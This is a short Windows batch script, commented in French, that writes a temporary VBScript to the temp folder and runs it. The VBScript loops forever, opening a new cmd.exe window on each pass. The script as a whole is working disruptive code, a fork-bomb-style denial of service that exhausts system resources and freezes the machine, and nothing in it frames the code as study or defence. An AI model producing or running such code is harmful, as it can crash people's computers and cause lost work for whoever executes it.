@echo off
set vbscriptFile=%temp%\open_cmd.vbs

:: Crée un script VBScript temporaire
echo Set objShell = CreateObject("WScript.Shell") > "%vbscriptFile%"
echo Do >> "%vbscriptFile%"
echo     objShell.Run "cmd.exe", 1, False >> "%vbscriptFile%"
echo Loop >> "%vbscriptFile%"

:: Exécute le script VBScript
wscript.exe "%vbscriptFile%"

:: Supprime le script VBScript après exécution (optionnel)
:: del "%vbscriptFile%"